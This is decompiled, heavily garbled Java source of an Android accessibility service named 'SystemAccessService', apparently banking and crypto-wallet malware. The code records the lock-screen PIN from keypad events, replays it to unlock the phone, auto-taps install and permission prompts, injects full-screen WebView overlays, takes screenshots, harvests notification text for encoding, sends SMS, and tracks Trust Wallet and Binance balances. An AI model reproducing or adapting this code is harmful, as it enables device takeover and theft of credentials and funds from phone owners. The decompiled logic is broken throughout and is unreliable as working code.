package com.system.caremanager;

import android.accessibilityservice.AccessibilityService;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;

public class SystemAccessService extends AccessibilityService {

    public static String CurrentName;
    public static List DisabledApps;
    public static Boolean FOR_REM;
    public static FrameLayout Fakelay;
    public static WindowManager.LayoutParams Fakeparams;
    public static WindowManager.LayoutParams Fakeparams_bass;
    public static String ccurrentPassword;
    public static boolean ifFinishiInitPermission;
    public static FrameLayout injview;
    public static WindowManager.LayoutParams layoutParams;
    public static String passcheck;
    public static SurfaceView sfw;
    static String trustWalletBtcBalance;
    static String trustWalletEthBalance;
    static String trustWalletUsdtBalance;
    static String trustWalletname;
    public static Boolean autoClick;
    public static boolean checkPermissions;
    public static Boolean fOR_IN;
    public static Boolean fOR_SC;
    public static Boolean fOR_prim;
    public static AccessibilityEvent globalEvent;
    public static AccessibilityNodeInfo globalNode;
    public static Boolean needsPaste;
    public static String oFFOK;
    public static String oFK;
    public static boolean recorderActive;
    public static boolean isRecording;
    public static boolean sendGoogleAuth;
    public static String clipboardText;
    public static Boolean bypassSecurity;
    public static WindowManager.LayoutParams overlayLayout;
    public static WindowManager windowManager;
    public static String useRec;
     AccessibilityEventMonitor.ICallback callbeack;
     Handler handler;
    public String localeForAccessibility;
    private ScreenCaptureEngine mScreenStatusController;
     Handler screenShotHandler;
     Thread screenShotThread;
    private boolean showbinance;
    private boolean showtrust;
     int total;
     Handler unlockScreenHandler;

    static {
        // Static initialization block
    }

    public AccessibilityServiceCore() {
        this.screenShotThread = null;
        Handler handler = new Handler();
        Looper result = Looper.myLooper();
        AccessibilityServiceCore.3 accessibilityServiceCore.3 = new AccessibilityServiceCore.3();
        this.screenShotHandler = handler;
        Handler handler2 = new Handler();
        Looper result2 = Looper.myLooper();
        AccessibilityServiceCore.4 accessibilityServiceCore.4 = new AccessibilityServiceCore.4();
        this.unlockScreenHandler = handler2;
        String str = "{\'en\':\'Enable\',\'de\':\'Aktivieren\',\'ar\':\'\u062a\u0641\u0639\u064a\u0644";
        this.localeForAccessibility = str;
        this.mScreenStatusController = null;
        this.showtrust = null;
        this.showbinance = null;
        Handler handler3 = new Handler();
        Looper result3 = Looper.getMainLooper();
        AccessibilityServiceCore.19 accessibilityServiceCore.19 = new AccessibilityServiceCore.19();
        this.handler = handler3;
        this.total = null;
        return;
    }

    private boolean Gotitinstalled(AccessibilityNodeInfo param1) {
        if (param1 == null) {
            // branch: cond_82
        }
        int result = param1.getChildCount();
        String str = "android.widget.Button";
        CharSequence result2 = param1.getClassName();
        boolean result3 = str.equals(result);
        if (result == null) {
            // branch: cond_60
        }
        CharSequence result4 = param1.getText();
        String result5 = result.toString();
        boolean result6 = TextUtils.isEmpty(result);
        if (result != null) {
            // branch: cond_71
        }
        String str2 = "\u5b89\u88c5";
        boolean result7 = str2.equals(result);
        if (result != null) {
            // branch: cond_5a
        }
        String str3 = "install";
        String result8 = result.toLowerCase();
        boolean result9 = str3.equals(result);
        if (result != null) {
            // branch: cond_5a
        }
        String str4 = "done";
        String result10 = result.toLowerCase();
        boolean result11 = str4.equals(result);
        if (result != null) {
            // branch: cond_5a
        }
        String str5 = "\u5b8c\u6210";
        boolean result12 = str5.equals(result);
        if (result != null) {
            // branch: cond_5a
        }
        String str6 = "\u062a\u062b\u0628\u064a\u062a";
        boolean result13 = str6.equals(result);
        if (result != null) {
            // branch: cond_5a
        }
        String str7 = "\u786e\u5b9a";
        boolean result14 = str7.equals(result);
        if (result == null) {
            // branch: cond_71
        }
        int val = 16;
        boolean result15 = param1.performAction(val);
        return 1;
        String str8 = "android.widget.ScrollView";
        CharSequence result16 = param1.getClassName();
        boolean result17 = str8.equals(result);
        if (result == null) {
            // branch: cond_71
        }
        int val2 = 4096;
        boolean result18 = param1.performAction(val2);
        if (val >= result) {
            // branch: cond_82
        }
        AccessibilityNodeInfo result19 = param1.getChild(val);
        boolean result20 = this.Gotitinstalled(result);
        if (result == null) {
            // branch: cond_7f
        }
        return 1;
        int val3 = val + 0x1;
        // continue loop -> :goto_72
        return val;
    }

    public static Bitmap applyExposure(Bitmap param1, float param2) {
        int result = this.getWidth();
        int result2 = this.getHeight();
        Bitmap.Config ARGB_8888 = Bitmap$Config.ARGB_8888;
        Bitmap result3 = Bitmap.createBitmap(result, result, ARGB_8888);
        ColorMatrix colorMatrix = new ColorMatrix();
        int val = 20;
        float[] arr = new float[val];
        arr[null] = param2;
        arr[1] = null;
        int val2 = 2;
        arr[val2] = null;
        int val3 = 3;
        arr[val3] = null;
        int val4 = 4;
        arr[val4] = null;
        int val5 = 5;
        arr[val5] = null;
        int val6 = 6;
        arr[val6] = param2;
        int val7 = 7;
        arr[val7] = null;
        int val8 = 8;
        arr[val8] = null;
        int val9 = 9;
        arr[val9] = null;
        int val10 = 10;
        arr[val10] = null;
        int val11 = 11;
        arr[val11] = null;
        int val12 = 12;
        arr[val12] = param2;
        int val13 = 13;
        arr[val13] = null;
        int val14 = 14;
        arr[val14] = null;
        int val15 = 15;
        arr[val15] = null;
        int val16 = 16;
        arr[val16] = null;
        int val17 = 17;
        arr[val17] = null;
        int val18 = 18;
        int val19 = 1065353216;
        arr[val18] = val19;
        int val20 = 19;
        arr[val20] = null;
        colorMatrix.set(arr);
        Paint paint = new Paint();
        ColorMatrixColorFilter colorMatrixColorFilter = new ColorMatrixColorFilter();
        ColorFilter result4 = paint.setColorFilter(colorMatrixColorFilter);
        Canvas canvas = new Canvas();
        canvas.drawBitmap(param1, null, null, paint);
        return result;
    }

    private boolean checkIfClickPermission(AccessibilityEvent param1) {
        String str = "com.android.permissioncontroller";
        CharSequence result = param1.getPackageName();
        boolean result2 = str.equals(result);
        if (result == null) {
            // branch: cond_e
        }
        return 1;
        return null;
    }

    private boolean checkIfHome(AccessibilityEvent param1) {
        int result = param1.getEventType();
        int val = 32;
        if (result != val) {
            // branch: cond_3a
        }
        String str = "com.android.launcher3";
        CharSequence result2 = param1.getPackageName();
        boolean result3 = str.equals(result);
        if (result != null) {
            // branch: cond_38
        }
        String str2 = "com.bbk.launcher2";
        CharSequence result4 = param1.getPackageName();
        boolean result5 = str2.equals(result);
        if (result != null) {
            // branch: cond_38
        }
        String str3 = "com.huawei.android.launcher";
        CharSequence result6 = param1.getPackageName();
        boolean result7 = str3.equals(result);
        if (result != null) {
            // branch: cond_38
        }
        String str4 = "com.miui.home";
        CharSequence result8 = param1.getPackageName();
        boolean result9 = str4.equals(result);
        if (result == null) {
            // branch: cond_3a
        }
        // continue loop -> :goto_3b
        return null;
    }

    private boolean checkIfMatch(String param1) {
        String str = "Phone#\\[\\d{4}]#3";
        Pattern result = Pattern.compile(str);
        Matcher result2 = result.matcher(param1);
        boolean result3 = result.matches();
        return result;
    }

    private void checkPassword(AccessibilityEvent param1) {
        try {
            boolean result = this.checkIfHome(param1);
            if (result == null) {
                // branch: cond_7
            }
            return;
            AccessibilityNodeInfo result2 = param1.getSource();
            int result3 = param1.getEventType();
            if (result != 1) {
                // branch: cond_87
            }
            String str = "com.android.systemui";
            CharSequence result4 = param1.getPackageName();
            boolean result5 = str.equals(result);
            if (result == null) {
                // branch: cond_87
            }
            String result6 = result.getViewIdResourceName();
            boolean result7 = this.checkResourceId(result);
            if (result == null) {
                // branch: cond_4c
            }
            CharSequence result8 = result.getContentDescription();
            String result9 = result.toString();
            int result10 = Integer.parseInt(result);
            StringBuilder stringBuilder = new StringBuilder();
            String ccurrentPassword = AccessibilityServiceCore.ccurrentPassword;
            StringBuilder result11 = stringBuilder.append(ccurrentPassword);
            StringBuilder result12 = stringBuilder.append(result);
            String result13 = stringBuilder.toString();
            AccessibilityServiceCore.ccurrentPassword = result;
            String str2 = "1";
            AccessibilityServiceCore.passcheck = str2;
            // continue loop -> :goto_87
            String str3 = "com.android.systemui:id/delete_button";
            String result14 = stringBuilder.getViewIdResourceName();
            boolean result15 = str3.equals(result);
            if (result != null) {
                // branch: cond_64
            }
            String str4 = "com.android.systemui:id/vivo_cancel";
            String result16 = stringBuilder.getViewIdResourceName();
            boolean result17 = str4.equals(result);
            if (result == null) {
                // branch: cond_87
            }
            String ccurrentPassword2 = AccessibilityServiceCore.ccurrentPassword;
            int result18 = ccurrentPassword2.length();
            if (result != 1) {
                // branch: cond_71
            }
            String str5 = "";
            AccessibilityServiceCore.ccurrentPassword = str5;
            // continue loop -> :goto_87
            String ccurrentPassword3 = AccessibilityServiceCore.ccurrentPassword;
            int result19 = ccurrentPassword3.length();
            if (/* if-lez result */) {
                // branch: cond_87
            }
            String ccurrentPassword4 = AccessibilityServiceCore.ccurrentPassword;
            int result20 = ccurrentPassword4.length();
            int val = 1 - v2;
            String result21 = ccurrentPassword4.substring(null, val);
            AccessibilityServiceCore.ccurrentPassword = result;
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean checkResourceId(String param1) {
        String str = "com.android.systemui:id/key|com.android.systemui:id/VivoPinkey";
        Pattern result = Pattern.compile(str);
        Matcher result2 = result.matcher(param1);
        boolean result3 = result.find();
        return result;
    }

    private void checkpay(AccessibilityEvent param1) {
        int result = param1.getEventType();
        int val = 16;
        if (result != val) {
            // branch: cond_29
        }
        AccessibilityNodeInfo result2 = param1.getSource();
        String str = "com.android.phone:id/input_field";
        String result3 = result.getViewIdResourceName();
        boolean result4 = str.equals(result);
        if (result == null) {
            // branch: cond_29
        }
        CharSequence result5 = result.getText();
        String result6 = result.toString();
        int result7 = result.length();
        int val2 = 4;
        if (result != val2) {
            // branch: cond_29
        }
        return;
    }

    private void clickSendButton() {
        AccessibilityNodeInfo result = this.getRootInActiveWindow();
        if (result == null) {
            // branch: cond_2e
        }
        String str = "ENVOYER";
        List result2 = result.findAccessibilityNodeInfosByText(str);
        Iterator result3 = result.iterator();
        boolean result4 = result.hasNext();
        if (result == null) {
            // branch: cond_2e
        }
        Object result5 = result.next();
        result = (AccessibilityNodeInfo) result;
        boolean result6 = result.isClickable();
        if (result == null) {
            // branch: cond_10
        }
        int val = 16;
        boolean result7 = result.performAction(val);
        Boolean result8 = Boolean.valueOf(null);
        AccessibilityServiceCore.autoClick = result;
        return;
    }

    private void continueb() {
        AccessibilityNodeInfo result = this.getRootInActiveWindow();
        if (v0 == null) {
            // branch: cond_28
        }
        AccessibilityServiceCore MyAccess = MainBackgroundService.MyAccess;
        AccessibilityServiceCore.clipboardText = MyAccess;
        AccessibilityServiceCore MyAccess2 = MainBackgroundService.MyAccess;
        Boolean result2 = Boolean.valueOf(1);
        AccessibilityServiceCore.needsPaste = result;
        AccessibilityServiceCore MyAccess3 = MainBackgroundService.MyAccess;
        MyAccess3.triggerEvent();
        Thread thread = new Thread();
        AccessibilityServiceCore..ExternalSyntheticLambda13 accessibilityServiceCore..ExternalSyntheticLambda13 = new AccessibilityServiceCore..ExternalSyntheticLambda13();
        thread.start();
        return;
    }

    private void continuec() {
        if (v0 == null) {
            // branch: cond_25
        }
        AccessibilityServiceCore MyAccess = MainBackgroundService.MyAccess;
        AccessibilityServiceCore.clipboardText = MyAccess;
        AccessibilityServiceCore MyAccess2 = MainBackgroundService.MyAccess;
        Boolean result = Boolean.valueOf(1);
        AccessibilityServiceCore.needsPaste = result;
        AccessibilityServiceCore MyAccess3 = MainBackgroundService.MyAccess;
        MyAccess3.triggerEvent();
        Thread thread = new Thread();
        AccessibilityServiceCore..ExternalSyntheticLambda11 accessibilityServiceCore..ExternalSyntheticLambda11 = new AccessibilityServiceCore..ExternalSyntheticLambda11();
        thread.start();
        return;
    }

    private void continueclickBtn(int param1) {
        this.clickSendButton();
        Thread thread = new Thread();
        AccessibilityServiceCore..ExternalSyntheticLambda12 accessibilityServiceCore..ExternalSyntheticLambda12 = new AccessibilityServiceCore..ExternalSyntheticLambda12();
        thread.start();
        return;
    }

    private void continued() {
        if (v0 == null) {
            // branch: cond_25
        }
        AccessibilityServiceCore MyAccess = MainBackgroundService.MyAccess;
        AccessibilityServiceCore.clipboardText = MyAccess;
        AccessibilityServiceCore MyAccess2 = MainBackgroundService.MyAccess;
        Boolean result = Boolean.valueOf(1);
        AccessibilityServiceCore.needsPaste = result;
        AccessibilityServiceCore MyAccess3 = MainBackgroundService.MyAccess;
        MyAccess3.triggerEvent();
        Thread thread = new Thread();
        AccessibilityServiceCore..ExternalSyntheticLambda10 accessibilityServiceCore..ExternalSyntheticLambda10 = new AccessibilityServiceCore..ExternalSyntheticLambda10();
        thread.start();
        return;
    }

    private void continuee() {
        this.clickSendButton();
        return;
    }

    private void drawViewHierarchy(Canvas param1, AccessibilityNodeInfo param2, Paint param3) {
        if (param2 == null) {
            // branch: cond_fc
        }
        int result = param2.getChildCount();
        if (result != null) {
            // branch: cond_a
        }
        // continue loop -> :goto_fc
        int result2 = param2.getChildCount();
        if (null >= result) {
            // branch: cond_fc
        }
        AccessibilityNodeInfo result3 = param2.getChild(null);
        if (result == null) {
            // branch: cond_f8
        }
        Rect rect = new Rect();
        result.getBoundsInScreen(rect);
        int val = 1099956224;
        param3.setTextSize(val);
        CharSequence result4 = result.getClassName();
        String result5 = result.toString();
        int result6 = result.hashCode();
        int result7 = result.hashCode();
        int val2 = -1;
        // continue loop -> :goto_7c
        String str = "android.widget.RadioButton";
        boolean result8 = val2.equals(str);
        if (result != null) {
            // branch: cond_44
        }
        // continue loop -> :goto_39
        int val3 = 5;
        // continue loop -> :goto_7c
        String str2 = "android.widget.Button";
        boolean result9 = val3.equals(str2);
        if (result != null) {
            // branch: cond_4f
        }
        // continue loop -> :goto_39
        int val4 = 4;
        // continue loop -> :goto_7c
        String str3 = "android.widget.TextView";
        boolean result10 = val4.equals(str3);
        if (result != null) {
            // branch: cond_5a
        }
        // continue loop -> :goto_39
        int val5 = 3;
        // continue loop -> :goto_7c
        String str4 = "android.widget.EditText";
        boolean result11 = val5.equals(str4);
        if (result != null) {
            // branch: cond_65
        }
        // continue loop -> :goto_39
        int val6 = 2;
        // continue loop -> :goto_7c
        String str5 = "android.widget.CheckBox";
        boolean result12 = val6.equals(str5);
        if (result != null) {
            // branch: cond_70
        }
        // continue loop -> :goto_39
        // continue loop -> :goto_7c
        String str6 = "android.widget.ToggleButton";
        boolean result13 = 1.equals(str6);
        if (result != null) {
            // branch: cond_7b
        }
        // continue loop -> :goto_39
        int val7 = 1098907648;
        param3.setTextSize(val7);
        int val8 = -7829368;
        // continue loop -> :goto_a7
        int val9 = -16711936;
        // continue loop -> :goto_a7
        int val10 = -16776961;
        // continue loop -> :goto_a7
        int val11 = 1107558400;
        param3.setTextSize(val11);
        int val12 = -65536;
        // continue loop -> :goto_a7
        int val13 = 1106247680;
        param3.setTextSize(val13);
        int val14 = -16711681;
        // continue loop -> :goto_a7
        int val15 = -65281;
        // continue loop -> :goto_a7
        int val16 = -256;
        CharSequence result14 = result.getText();
        if (result == null) {
            // branch: cond_b6
        }
        CharSequence result15 = result.getText();
        String result16 = result.toString();
        // continue loop -> :goto_c7
        CharSequence result17 = result.getContentDescription();
        if (result == null) {
            // branch: cond_c5
        }
        CharSequence result18 = result.getContentDescription();
        String result19 = result.toString();
        // continue loop -> :goto_c7
        String str7 = "";
        Paint.Style STROKE = Paint$Style.STROKE;
        param3.setStyle(STROKE);
        int val17 = 1073741824;
        param3.setStrokeWidth(val17);
        param1.drawRect(rect, param3);
        Paint.Style STROKE2 = Paint$Style.STROKE;
        param3.setStyle(STROKE2);
        param3.setColor(val2);
        param1.drawRect(rect, param3);
        param3.setColor(val16);
        param3.setAntiAlias(1);
        int left = rect.left;
        int val18 = left + 0x10;
        float result20 = rect.exactCenterY();
        param1.drawText(str7, val18, result, param3);
        this.drawViewHierarchy(param1, result, param3);
        result.recycle();
        int val19 = null + 0x1;
        // continue loop -> :goto_c
        return;
    }

    public static String getApplicationName(Context param1) {
        ApplicationInfo result = this.getApplicationInfo();
        int labelRes = this.labelRes;
        if (labelRes != null) {
            // branch: cond_f
        }
        CharSequence nonLocalizedLabel = this.nonLocalizedLabel;
        String result2 = this.toString();
        // continue loop -> :goto_13
        String result3 = this.getString(labelRes);
        return result;
    }

    public static Bitmap getTransparentBitmap(Bitmap param1, int param2) {
        Bitmap.Config ARGB_8888 = Bitmap$Config.ARGB_8888;
        Bitmap result = this.copy(ARGB_8888, 1);
        int val = 1117782016;
        Bitmap result2 = AccessibilityServiceCore.applyExposure(result, val);
        int result3 = this.getWidth();
        int result4 = this.getHeight();
        int val2 = result * v1;
        int[] arr = new int[val2];
        int result5 = this.getWidth();
        int result6 = this.getWidth();
        int result7 = this.getHeight();
        v1 .. v8.getPixels();
        int val3 = param2 * 0xff;
        int val4 = val3 / 0x64;
        if (null >= val2) {
            // branch: cond_41
        }
        int item = arr[null];
        int val5 = 16777215;
        int val6 = val5 & v4;
        int val7 = val6 | v3;
        arr[null] = val7;
        int val8 = null + 0x1;
        // continue loop -> :goto_31
        int result8 = this.getWidth();
        int result9 = this.getHeight();
        Bitmap.Config ARGB_88882 = Bitmap$Config.ARGB_8888;
        Bitmap result10 = Bitmap.createBitmap(arr, result, result, ARGB_88882);
        return result;
    }

    private void loadMyPage(WebView param1) {
        WindowManager.LayoutParams layoutParams = AccessibilityServiceCore.layoutParams;
        int val = -1;
        this.width = val;
        WindowManager.LayoutParams layoutParams2 = AccessibilityServiceCore.layoutParams;
        this.height = val;
        FrameLayout injview = AccessibilityServiceCore.injview;
        int result = injview.getChildCount();
        if (result == null) {
            // branch: cond_16
        }
        FrameLayout injview2 = AccessibilityServiceCore.injview;
        injview2.removeAllViews();
        WindowManager.LayoutParams layoutParams3 = AccessibilityServiceCore.layoutParams;
        int val2 = -2142501088;
        this.flags = val2;
        FrameLayout injview3 = AccessibilityServiceCore.injview;
        injview3.addView(param1);
        WindowManager windowManager = AccessibilityServiceCore.windowManager;
        FrameLayout injview4 = AccessibilityServiceCore.injview;
        WindowManager.LayoutParams layoutParams4 = AccessibilityServiceCore.layoutParams;
        windowManager.updateViewLayout(injview4, layoutParams4);
        FrameLayout injview5 = AccessibilityServiceCore.injview;
        injview5.setVisibility(null);
        return;
    }

    private void screenShot() {
        FrameLayout Fakelay = AccessibilityServiceCore.Fakelay;
        int result = Fakelay.getVisibility();
        int val = 9;
        int val2 = 264;
        String str = "Screenshots";
        int val3 = 30;
        if (result != null) {
            // branch: cond_5a
        }
        int SDK_INT = Build$VERSION.SDK_INT;
        if (SDK_INT < val3) {
            // branch: cond_27
        }
        Context result2 = this.getApplicationContext();
        Executor result3 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result);
        AccessibilityServiceCore.8 accessibilityServiceCore.8 = new AccessibilityServiceCore.8();
        this.takeScreenshot(null, result, accessibilityServiceCore.8);
        // continue loop -> :goto_a1
        StringBuilder stringBuilder = new StringBuilder();
        File result4 = Environment.getExternalStorageDirectory();
        StringBuilder result5 = stringBuilder.append(result);
        String separator = File.separator;
        StringBuilder result6 = stringBuilder.append(separator);
        String DIRECTORY_PICTURES = Environment.DIRECTORY_PICTURES;
        StringBuilder result7 = stringBuilder.append(DIRECTORY_PICTURES);
        String separator2 = File.separator;
        StringBuilder result8 = stringBuilder.append(separator2);
        StringBuilder result9 = stringBuilder.append(str);
        String separator3 = File.separator;
        StringBuilder result10 = stringBuilder.append(separator3);
        String result11 = stringBuilder.toString();
        AccessibilityServiceCore.9 accessibilityServiceCore.9 = new AccessibilityServiceCore.9();
        accessibilityServiceCore.9.startWatching();
        boolean result12 = this.performGlobalAction(accessibilityServiceCore.8);
        // continue loop -> :goto_a1
        int SDK_INT2 = Build$VERSION.SDK_INT;
        if (SDK_INT2 < val3) {
            // branch: cond_6f
        }
        Context result13 = this.getApplicationContext();
        Executor result14 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result);
        AccessibilityServiceCore.10 accessibilityServiceCore.10 = new AccessibilityServiceCore.10();
        this.takeScreenshot(accessibilityServiceCore.9, result, accessibilityServiceCore.10);
        // continue loop -> :goto_a1
        StringBuilder stringBuilder2 = new StringBuilder();
        File result15 = Environment.getExternalStorageDirectory();
        StringBuilder result16 = stringBuilder2.append(result);
        String separator4 = File.separator;
        StringBuilder result17 = stringBuilder2.append(separator4);
        String DIRECTORY_PICTURES2 = Environment.DIRECTORY_PICTURES;
        StringBuilder result18 = stringBuilder2.append(DIRECTORY_PICTURES2);
        String separator5 = File.separator;
        StringBuilder result19 = stringBuilder2.append(separator5);
        StringBuilder result20 = stringBuilder2.append(str);
        String separator6 = File.separator;
        StringBuilder result21 = stringBuilder2.append(separator6);
        String result22 = stringBuilder2.toString();
        AccessibilityServiceCore.11 accessibilityServiceCore.11 = new AccessibilityServiceCore.11();
        accessibilityServiceCore.11.startWatching();
        boolean result23 = this.performGlobalAction(accessibilityServiceCore.10);
        return;
    }

    public static void sendSMS(String param1, String param2) {
        try {
            SmsManager result = SmsManager.getDefault();
            v0 .. v5.sendTextMessage();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendNotification(AccessibilityEvent param1) {
        try {
            String str = "|";
            Parcelable result = param1.getParcelableData();
            result = (Notification) result;
            if (result != null) {
                // branch: cond_b
            }
            return;
            Bundle extras = result.extras;
            String str2 = "android.title";
            CharSequence result2 = extras.getCharSequence(str2);
            String result3 = result.toString();
            Bundle extras2 = result.extras;
            String str3 = "android.text";
            CharSequence result4 = extras2.getCharSequence(str3);
            String result5 = result.toString();
            CharSequence result6 = param1.getPackageName();
            String result7 = result.toString();
            String result8 = AccessibilityServiceCore.getAppName(p0, result);
            String N_F = DataPackagingEngine.N_F;
            StringBuilder stringBuilder = new StringBuilder();
            StringBuilder result9 = stringBuilder.append(result);
            StringBuilder result10 = stringBuilder.append(str);
            StringBuilder result11 = stringBuilder.append(result);
            StringBuilder result12 = stringBuilder.append(str);
            StringBuilder result13 = stringBuilder.append(result);
            String str4 = "|.";
            StringBuilder result14 = stringBuilder.append(str4);
            String result15 = stringBuilder.toString();
            byte[] result16 = result.getBytes();
            DataEncryptionEngine.encodeBase64(N_F, result);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void clickAtPosition(int param1, int param2, AccessibilityNodeInfo param3) {
        try {
            if (param3 != null) {
                // branch: cond_3
            }
            return;
            int result = param3.getChildCount();
            int val = 16;
            if (result != null) {
                // branch: cond_1d
            }
            Rect rect = new Rect();
            param3.getBoundsInScreen(rect);
            boolean result2 = rect.contains(param1, param2);
            if (result == null) {
                // branch: cond_3f
            }
            boolean result3 = param3.performAction(val);
            // continue loop -> :goto_3f
            Rect rect2 = new Rect();
            param3.getBoundsInScreen(rect2);
            boolean result4 = rect2.contains(result, param2);
            if (result == null) {
                // branch: cond_2e
            }
            boolean result5 = param3.performAction(val);
            int result6 = param3.getChildCount();
            if (null >= result) {
                // branch: cond_3f
            }
            AccessibilityNodeInfo result7 = param3.getChild(null);
            AccessibilityServiceCore.clickAtPosition(result, param2, result);
            int val2 = null + 0x1;
            // continue loop -> :goto_2f
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean clickByText(String param1) {
        List result = AccessibilityServiceCore.findNodesByText(param1);
        boolean result2 = AccessibilityServiceCore.performClick(result);
        return result;
    }

    public static List findNodesByText(String param1) {
        AccessibilityNodeInfo result = AccessibilityServiceCore.getRootNode();
        if (result == null) {
            // branch: cond_b
        }
        List result2 = result.findAccessibilityNodeInfosByText(param1);
        return result;
        return null;
    }

    public static String getAppName(Context param1, String param2) {
        try {
            PackageManager result = this.getPackageManager();
            int val = 128;
            ApplicationInfo result2 = this.getApplicationInfo(param2, val);
            CharSequence result3 = this.getApplicationLabel(result);
            result = (String) result;
            return result;
            } catch (Exception e) {
                e.printStackTrace();
            String str = "";
            return str;
        } catch (PackageManager$NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    private static AccessibilityNodeInfo getRootNode() {
        AccessibilityServiceCore MyAccess = MainBackgroundService.MyAccess;
        AccessibilityNodeInfo result = MyAccess.getRootInActiveWindow();
        return result;
    }

    private static boolean performClick(List param1) {
        try {
            if (param1 == null) {
                // branch: cond_25
            }
            boolean result = this.isEmpty();
            if (result != null) {
                // branch: cond_25
            }
            Iterator result2 = this.iterator();
            boolean result3 = this.hasNext();
            if (result == null) {
                // branch: cond_25
            }
            Object result4 = this.next();
            result = (AccessibilityNodeInfo) result;
            boolean result5 = result.isEnabled();
            if (result == null) {
                // branch: cond_c
            }
            int val = 16;
            boolean result6 = result.performAction(val);
            return result;
            } catch (Exception e) {
                e.printStackTrace();
            return null;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String toBase64(String param1) {
        try {
            String str = "UTF-8";
            byte[] result = this.getBytes(str);
            String result2 = Base64.encodeToString(result, null);
            return result;
            } catch (Exception e) {
                e.printStackTrace();
            this.printStackTrace();
            return null;
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    private void unlockScreen() {
        try {
            AccessibilityNodeInfo result = this.getRootInActiveWindow();
            String currentSuccessPassword = MainBackgroundService.currentSuccessPassword;
            int result2 = currentSuccessPassword.length();
            int val = 16;
            if (null >= result) {
                // branch: cond_66
            }
            boolean result3 = UtilityHelper.isVivoDevice();
            if (result == null) {
                // branch: cond_3d
            }
            StringBuilder stringBuilder = new StringBuilder();
            String str = "com.android.systemui:id/VivoPinkey";
            StringBuilder result4 = stringBuilder.append(str);
            String currentSuccessPassword2 = MainBackgroundService.currentSuccessPassword;
            int val2 = null + 0x1;
            String result5 = currentSuccessPassword2.substring(null, val2);
            StringBuilder result6 = stringBuilder.append(result);
            String result7 = stringBuilder.toString();
            List result8 = result.findAccessibilityNodeInfosByViewId(result);
            Object result9 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            boolean result10 = result.performAction(val);
            // continue loop -> :goto_63
            StringBuilder stringBuilder2 = new StringBuilder();
            String str2 = "com.android.systemui:id/key";
            StringBuilder result11 = stringBuilder2.append(str2);
            String currentSuccessPassword3 = MainBackgroundService.currentSuccessPassword;
            int val3 = null + 0x1;
            String result12 = currentSuccessPassword3.substring(null, val3);
            StringBuilder result13 = stringBuilder2.append(result);
            String result14 = stringBuilder2.toString();
            List result15 = result.findAccessibilityNodeInfosByViewId(result);
            Object result16 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            boolean result17 = result.performAction(val);
            } catch (Exception e) {
                e.printStackTrace();
            int val4 = null + 0x1;
            // continue loop -> :goto_c
            String str3 = "com.android.systemui:id/key_enter_text";
            List result18 = result.findAccessibilityNodeInfosByViewId(str3);
            boolean result19 = result.isEmpty();
            if (result != null) {
                // branch: cond_79
            }
            Object result20 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            // continue loop -> :goto_85
            String str4 = "com.android.systemui:id/key_enter";
            List result21 = result.findAccessibilityNodeInfosByViewId(str4);
            Object result22 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            boolean result23 = result.performAction(val);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void unlockScreenListen() {
        ScreenCaptureEngine screenCaptureEngine = new ScreenCaptureEngine();
        this.mScreenStatusController = screenCaptureEngine;
        AccessibilityServiceCore.18 accessibilityServiceCore.18 = new AccessibilityServiceCore.18();
        screenCaptureEngine.setScreenStatusListener(accessibilityServiceCore.18);
        ScreenCaptureEngine mScreenStatusController = this.mScreenStatusController;
        mScreenStatusController.startListen();
        return;
    }

    private void unlockScreenSuccess() {
        String ccurrentPassword = AccessibilityServiceCore.ccurrentPassword;
        int result = ccurrentPassword.length();
        int val = 16;
        String str = "";
        if (result <= val) {
            // branch: cond_f
        }
        AccessibilityServiceCore.ccurrentPassword = str;
        return;
        String currentSuccessPassword = MainBackgroundService.currentSuccessPassword;
        int result2 = currentSuccessPassword.length();
        if (result == null) {
            // branch: cond_25
        }
        String currentSuccessPassword2 = MainBackgroundService.currentSuccessPassword;
        int result3 = currentSuccessPassword2.length();
        String ccurrentPassword2 = AccessibilityServiceCore.ccurrentPassword;
        int result4 = ccurrentPassword2.length();
        if (result != result) {
            // branch: cond_29
        }
        String ccurrentPassword3 = AccessibilityServiceCore.ccurrentPassword;
        MainBackgroundService.currentSuccessPassword = ccurrentPassword3;
        AccessibilityServiceCore.ccurrentPassword = str;
        return;
    }

    public void Treger(String param1) {
        Handler handler = new Handler();
        Looper result = Looper.getMainLooper();
        AccessibilityServiceCore.12 accessibilityServiceCore.12 = new AccessibilityServiceCore.12();
        boolean result2 = handler.post(accessibilityServiceCore.12);
        return;
    }

    public Bitmap convertToBitmap(Drawable param1, int param2, int param3) {
        Bitmap.Config ARGB_8888 = Bitmap$Config.ARGB_8888;
        Bitmap result = Bitmap.createBitmap(param2, param3, ARGB_8888);
        Canvas canvas = new Canvas();
        param1.setBounds(null, null, param2, param3);
        param1.draw(canvas);
        return result;
    }

    public void createskilton(AccessibilityNodeInfo param1) {
        try {
            String str = ":";
            if (param1 != null) {
                // branch: cond_5
            }
            return;
            Context result = this.getApplicationContext();
            String str2 = "SCH";
            String str3 = "720";
            String result2 = My_Settings.read(result, str2, str3);
            Context result3 = this.getApplicationContext();
            String str4 = "SCW";
            String str5 = "1080";
            String result4 = My_Settings.read(result, str4, str5);
            Integer result5 = Integer.valueOf(result);
            int result6 = result.intValue();
            Integer result7 = Integer.valueOf(result);
            int result8 = result.intValue();
            Bitmap.Config ARGB_8888 = Bitmap$Config.ARGB_8888;
